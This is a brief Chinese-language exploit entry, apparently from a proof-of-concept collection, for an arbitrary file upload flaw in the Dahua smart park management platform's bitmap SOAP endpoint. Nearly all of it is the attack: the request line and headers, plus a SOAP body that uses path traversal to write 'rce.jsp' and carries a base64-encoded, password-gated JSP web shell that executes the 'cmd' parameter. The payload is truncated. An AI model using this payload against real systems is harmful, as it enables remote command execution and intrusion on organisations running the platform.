# 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /emap/webservice/gis/soap/bitmap HTTP/1.1`
- **关键头**：`Host: your-ip`　`Content-Type: text/xml; charset=utf-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<arg0>
<picPath>/../rce.jsp</picPath>
</arg0>
<arg1>PCUgaWYoIjEyMyIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpeyBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7IGludCBhID0gLTE7IGJ5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07IG91dC5wcmludCgiPHByZT4iKTsgd2hpbGUoKGE9aW4ucmVhZChiKSkhPS0xKXsgb3V0LnByaW50bG4obmV3IFN0cmluZyhiK…（脚本共 803 字，完整版见原文）
```